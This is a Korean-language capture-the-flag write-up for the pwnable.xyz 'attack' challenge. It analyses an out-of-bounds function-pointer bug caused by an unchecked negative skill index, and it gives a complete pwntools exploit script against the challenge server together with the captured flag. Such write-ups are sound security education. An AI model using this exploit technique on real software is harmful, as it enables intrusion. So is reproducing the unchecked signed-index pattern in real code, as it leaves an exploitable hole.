# [pwnable.xyz] attack

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Can you win the Arena?
>
> Release: [attack.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8998324/attack.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176111469-59cac211-1bd0-4377-9a9b-1e8da3425455.png)

## Analysis

### `struct Skill`

![image](https://user-images.githubusercontent.com/104156058/176114967-396dd1ca-37de-4330-8c0e-cf0f44a4897e.png)

스킬의 정보를 담고 있는 구조체이다. 스킬의 이름 `Name`, 랜덤 값으로 초기화되는 `Value`, 공격 스킬인지 여부 `IsAttackSkill`, 스킬을 시전했을 때 실행될 함수 포인터 `Skill_Func`로 구성된다.

### `struct Equip`

![image](https://user-images.githubusercontent.com/104156058/176115412-d506df8b-3897-4f91-a68f-e09a50c1a602.png)

장비의 정보를 담고 있는 구조체이다. 장비의 이름 `Name`, 방어력 `DefValue`로 구성된다.

### `struct Player`

![image](https://user-images.githubusercontent.com/104156058/176115868-9039c4ec-c96b-4073-aa73-000deaeb491a.png)

플레이어의 정보를 담고 있는 구조체이다. 이름 `Name`, 직업 `Class`, 최대 체력 `MaxHP`, 현재 체력 `CurHP`, 생존 여부 `IsAlive`, 컴퓨터가 플레이하는지 여부 `IsCPU`, 스킬 3개의 정보 `Skills`(`Skill` 구조체 3개), 장비의 정보를 담고 있는 `Equip`으로 구성된다.

### `struct Team`

![image](https://user-images.githubusercontent.com/104156058/176117530-10e7d275-414d-4377-880c-7d3ac44e28c0.png)

팀의 정보를 담고 있는 구조체이다. 팀 이름 `TeamName`, 플레이어 두 명의 정보 `Players`(`Player` 구조체 2개)로 구성된다.

### `win()`

```c
void __cdecl win()
{
  system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### Vulnerability

```c
  puts("Round (END): It's over");
  printf("Team '%s' won the match...\n\n", Teams[winner].TeamName);
  check_for_rankup(winner);
```

```c
void __cdecl check_for_rankup(int winner)
{
  if ( Rank <= 3 )
  {
    ++Rank;
    if ( winner )
      printf(
        "Well '%s' lost the fight, but everyone is a winner here, so they gain a rankup and are now '%s'\n",
        Teams[0].TeamName,
        Ranks[Rank]);
    else
      printf("Team '%s' rankup. Congratulations, you're now a '%s'\n", Teams[0].TeamName, Ranks[Rank]);
  }
}
```

`play()`에서 게임이 종료되면 `check_for_rankup()`을 실행하여 `Rank`를 1 증가시킨다.

```c
  if ( Rank > 1 )
    change_equip();
  if ( Rank > 2 )
    do_skill_change();
```

`play()`에서 게임을 시작하기 전에 `Rank`의 값을 검사하여, `2`보다 크면 `do_skill_change()`를 호출하여 스킬을 변경할 수 있게 해준다.

```c
    while ( 1 )
    {
      printf("Which skill do you want to change (3 to exit): ");
      destSkill = get_long();
      if ( destSkill > 2 )
        break;
      printf("What type of skill is this (0: Heal, 1: Attack): ");
      isAttack = get_long();
      if ( isAttack <= 1 )
      {
        player->Skills[destSkill].Skill_Func = SkillTable[isAttack];
        player->Skills[destSkill].IsAttackSkill = isAttack;
        player->Skills[destSkill].Value = get_rand(1000);
      }
    }
```

`do_skill_change()`에서, 변경할 스킬을 선택하고 스킬의 유형을 `Heal`과 `Attack` 중에서 선택할 수 있다. `isAttack`이 `1` 이하이면 `Skill_Func`에 `SkillTable[isAttack]`의 값을 넣는데, `isAttack`에 음수를 입력할 수 있어서 OOB 취약점이 발생한다.

## Exploit

BSS 영역에서 `SkillTable`의 앞쪽에 `win()`의 주소를 쓸 수 있으면, `Skill_Func`에 `win()`의 주소를 넣어서 `win()`을 호출할 수 있다.

`play()`에서 게임을 시작하기 전에 `Rank`의 값이 `1`보다 크면 `change_equip()`을 호출하여 장비를 변경할 수 있게 해준다.

```c
void __cdecl change_equip()
{
  char buf[64]; // [rsp+0h] [rbp-50h] BYREF
  unsigned __int64 v1; // [rsp+48h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  printf(
    "Since you're a %s now, you may modify your equip now.\nDo you want to change your equip (y/n)? : ",
    Ranks[Rank]);
  fgets(buf, 3, stdin);
  if ( buf[0] == 'y' )
  {
    printf("Name for your equip: ");
    memset(&Teams[0].Players[0].Equip, 0, 0x20uLL);
    fgets(Teams[0].Players[0].Equip.Name, 0x20, stdin);
    Teams[0].Players[0].Equip.DefValue = get_rand_range(1000LL);
    printf("That's some neat equip, you created there. Is has a def value of %lu\n", Teams[0].Players[0].Equip.DefValue);
  }
}
```

이때 장비의 이름을 입력받는데, `Equip` 구조체는 구조체 자체에 문자열을 그대로 저장하기 때문에 BSS 영역에 `0x20`바이트만큼 원하는 값을 쓸 수 있다. 여기에 `win()`의 주소를 쓰면 된다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30020)

sla = r.sendlineafter

win = 0x401372


# rank up

for game in range(3):
    while 1:
        r.recvuntil('Round (')
        turn = r.recvuntil(')')[:-1]
        if turn == b'END':
            break
        elif turn == b'Player':
            sla('Which skill do you want to use : ', '1')
            sla('Which target you want to use that skill on : ', '0')
    
    if game == 1:
        sla('Do you want to change your equip (y/n)? : ', 'n')


# write win() at Skill_Func

sla('Do you want to change your equip (y/n)? : ', 'y')
sla('Name for your equip: ', p64(win))

sla('Do you want to change the type of your skills (y/n)? : ', 'y')
sla('Which skill do you want to change (3 to exit): ', '0')
sla('What type of skill is this (0: Heal, 1: Attack): ', '-113')

sla('Which skill do you want to change (3 to exit): ', '3')


# call win()

sla('Which skill do you want to use : ', '0')
sla('Which target you want to use that skill on : ', '0')


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30020: Done
[*] Switching to interactive mode
FLAG{I_heard_sprint_is_dead}
```